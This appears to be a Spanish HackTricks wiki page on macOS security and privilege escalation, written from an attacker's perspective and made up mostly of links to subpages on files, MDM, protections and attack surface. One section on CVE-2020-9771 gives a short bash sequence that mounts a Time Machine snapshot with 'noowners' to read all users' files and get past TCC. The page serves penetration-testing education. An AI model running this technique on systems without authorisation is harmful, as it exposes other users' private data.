# Seguridad y escalada de privilegios en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales de errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones comunitarias

## Básicos de macOS

Si no estás familiarizado con macOS, deberías empezar aprendiendo los conceptos básicos de macOS:

* Archivos y permisos especiales de macOS:

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* Usuarios comunes de macOS

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* AppleFS

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* Arquitectura del kernel

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* Servicios y protocolos de red comunes de macOS

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MDM de macOS

En las empresas, los sistemas macOS probablemente estén altamente gestionados con un MDM. Por lo tanto, desde la perspectiva de un atacante, es interesante saber **cómo funciona**:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Inspección, depuración y fuzzing de aplicaciones de macOS

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## Protecciones de seguridad de macOS

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## Superficie de ataque

### Permisos de archivo

Si un **proceso que se ejecuta como root escribe** un archivo que puede ser controlado por un usuario, el usuario podría abusar de esto para **escalar privilegios**.\
Esto podría ocurrir en las siguientes situaciones:

* El archivo utilizado ya fue creado por un usuario (propiedad del usuario)
* El archivo utilizado es escribible por el usuario debido a un grupo
* El archivo utilizado está dentro de un directorio propiedad del usuario (el usuario podría crear el archivo)
* El archivo utilizado está dentro de un directorio propiedad de root, pero el usuario tiene acceso de escritura sobre él debido a un grupo (el usuario podría crear el archivo)

Poder **crear un archivo** que va a ser **utilizado por root**, permite a un usuario **aprovechar su contenido** o incluso crear **enlaces simbólicos/duros** para apuntarlo a otro lugar.

Para este tipo de vulnerabilidades, no olvides **comprobar los instaladores `.pkg` vulnerables**:

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### Abuso de privilegios y permisos mediante el abuso de procesos

Si un proceso puede **inyectar código en otro proceso con mejores privilegios o permisos** o contactarlo para realizar acciones de privilegios, podría escalar privilegios y evitar medidas defensivas como [Sandbox](macos-security-protections/macos-sandbox/) o [TCC](macos-security-protections/macos-tcc/).

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

### Aplicaciones de extensión de archivo

Las aplicaciones extrañas registradas por las extensiones de archivo podrían ser abusadas:

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

### Aplicaciones de controlador de URL

Diferentes aplicaciones pueden registrarse para abrir protocolos específicos. Podrían ser abusadas.

TODO: Crear una página sobre esto

## Escalada de privilegios de macOS

### CVE-2020-9771 - Bypass de TCC de mount\_apfs y escalada de privilegios

**Cualquier usuario** (incluso los no privilegiados) puede crear y montar una instantánea de Time Machine y **acceder a TODOS los archivos** de esa instantánea.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso de **Acceso completo al disco** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser otorgado por un administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### Información Sensible

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

En primer lugar, tenga en cuenta que **la mayoría de los trucos sobre la escalada de privilegios que afectan a Linux/Unix también afectarán a las máquinas MacOS**. Así que vea:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## Referencias

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lea tutoriales sobre errores web3

🔔 Reciba notificaciones sobre nuevos programas de recompensas por errores

💬 Participe en discusiones comunitarias

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
